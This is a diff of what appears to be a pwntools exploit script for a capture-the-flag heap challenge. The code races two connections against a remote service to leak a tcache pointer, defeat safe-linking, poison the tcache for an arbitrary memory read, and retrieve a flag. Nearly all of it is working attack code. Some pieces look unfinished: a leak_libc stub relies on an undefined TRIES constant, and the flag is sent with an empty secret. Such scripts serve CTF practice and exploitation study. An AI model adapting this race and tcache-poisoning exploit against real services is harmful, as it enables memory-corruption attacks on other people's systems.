@@ -12,7 +12,6 @@ from functools import partial
 
 SCANF_INPUT_SIZE = 1024
 HEAP_FIRST_OFF   = 0xf30
-SECRET_HEAP_OFF  = HEAP_FIRST_OFF + 0x20
 
 DATA_PREFIX = b"MESSAGE: "
 DATA_PREFIX_LEN = len(DATA_PREFIX)
@@ -45,7 +44,7 @@ def restart_server():
     get_server()
 
 
-def attach_gdb(gdbscript=""):
+def attach_gdb(gdbscript="", pause=False):
     global gdb_pid
     if not (args.gef or args.pwndbg):
         return
@@ -53,6 +52,9 @@ def attach_gdb(gdbscript=""):
     gdbscript = ("gef-init\n" if args.gef else "pwndbg-init\n") + gdbscript
     gdb_pid = p.gdb.attach(proc, gdbscript=gdbscript)
     time.sleep(1)
+
+    if pause:
+        input("Press any key to continue gdb")
 
 
 def detach_gdb():
@@ -78,12 +80,16 @@ class thread_comm(p.remote):
         time.sleep(0.1)
 
 
-    def prompt_cmd(self, cmd):
+    def prompt_cmd(self, cmd, idx = b''):
         if len(cmd) > SCANF_INPUT_SIZE:
             print("!WARNING! Length of cmd is larger than input max size.")
             cmd = cmd[:SCANF_INPUT_SIZE]
+
         if isinstance(cmd, str):
             cmd = cmd.encode()
+        if isinstance(idx, int):
+            idx = str(idx).encode()
+        cmd += b' ' + idx
 
         if self.do_send:
             self.sendline(cmd)
@@ -102,28 +108,24 @@ class thread_comm(p.remote):
         return ret
 
 
-    def send_idx(self, idx):
-        self.sendline(str(idx).encode())
-
-
-    def printf(self, idx: bytes, do_recv=True):
-        self.sendline(b"printf " + idx)
+    def printf(self, idx, do_recv=True):
+        self.prompt_cmd(b"printf", idx)
         if do_recv:
             self.recvuntil(DATA_PREFIX)
             return self.recvline(drop=True)
 
 
-    def malloc(self, idx: bytes):
-        self.prompt_cmd(b"malloc " + idx)
+    def malloc(self, idx):
+        self.prompt_cmd(b"malloc", idx)
 
 
-    def scanf(self, idx: bytes, msg):
+    def scanf(self, idx, msg):
         cmd = b"scanf " + idx + b' ' + msg
         self.prompt_cmd(cmd)
 
 
-    def free(self, idx: bytes):
-        self.prompt_cmd(b"free " + idx)
+    def free(self, idx):
+        self.prompt_cmd(b"free", idx)
 
 
     def send_flag(self, data: bytes):
@@ -200,30 +202,19 @@ def get_tcache_leak(thd1, thd2):
     return tcache_addr
 
 
-# maybe check if target_addr is a mod of 8/16
+# maybe check if target_addr is a mod of 16
 def arbitrary_read(thd1, thd2, target_addr: int):
-    target_addr_packed = p.p64(target_addr)
-    # attach_gdb('''
-    #     b malloc
-    #     c
-    #     finish
-    #     set $fmalloc = $rax
-    #
-    #     b fprintf
-    #     b free
-    # ''')
-
+    target_addr_packed = p.p64(target_addr).split(b'\x00')[0].strip()
     thd1.malloc(b'0')
     thd1.malloc(b'1')
     thd1.free(b'1')
-    detach_gdb()
 
-    # make_workers(1, thd2.free, b'0')
-    while True:
+    failed = True
+    for _ in range(60):
         if not os.fork():
             thd1.free(b'0')
             sys.exit(0)
-        thd2.send((b"scanf 0 " + target_addr_packed + b'\n') * 100)
+        thd2.send((b"scanf 0 " + target_addr_packed + b'\n') * 2000)
         os.wait()
 
         time.sleep(0.1)
@@ -231,37 +222,60 @@ def arbitrary_read(thd1, thd2, target_addr: int):
         data = thd1.printf(b'0')
 
         # because printf stops writing on a NULL byte
-        if data[:8] == target_addr_packed.split(b'\x00')[0]:
+        if data[:8] == target_addr_packed:
+            failed = False
             thd2.quit()
-            print("data: ", hex(to_addr(data)))
             break
 
-    attach_gdb('''
-        b malloc
-        c
-    ''')
+
+    if failed:
+        # import IPython; IPython.embed()
+        return b""
 
     thd1.malloc(b'1')
     return thd1.printf(b'1')
 
 
+def leak_libc():
+    thd1, thd2 = (None, None)   
+    for _ in range(TRIES):
+        thd1 = thread_comm()
+        thd2 = thread_comm()
+
+    return (thd1, thd2)
+
+
 def exploit():
+    # attach_gdb('''
+    #     b challenge
+    #     c
+    #     b malloc
+    #     b free
+    #     c
+    #     finish
+    # ''')
     thd1 = thread_comm()
     thd2 = thread_comm()
 
     tcache_xored_loc = get_tcache_leak(thd1, thd2)
     if not tcache_xored_loc:
         print(b"no tcache leak")
-        return b""
-    print("tcache xored loc: ", hex(tcache_xored_loc))
+        return
+    print("tcache xored loc:", hex(tcache_xored_loc))
 
-    target_addr = (tcache_xored_loc << 12) + SECRET_HEAP_OFF
+    target_addr = (tcache_xored_loc << 12) + HEAP_FIRST_OFF - 0x20
+    print("Target addr:", hex(target_addr))
     target_addr ^= tcache_xored_loc
-    secret = arbitrary_read(thd1, thd2, target_addr)
-    print("Leaked secret:", secret)
+    print("Target addr (xored):", hex(target_addr))
+    arbitrary_read(thd1, thd2, target_addr)
 
-    flag = thd1.send_flag(secret)
-    print(flag)
+    thd1.scanf(b'1', p.cyclic(16))
+    data = thd1.printf(b'1')
+    print(data)
+
+    attach_gdb()
+    flag = thd1.send_flag(b'')
+    print("FLAG:", flag)
 
 
 def main():
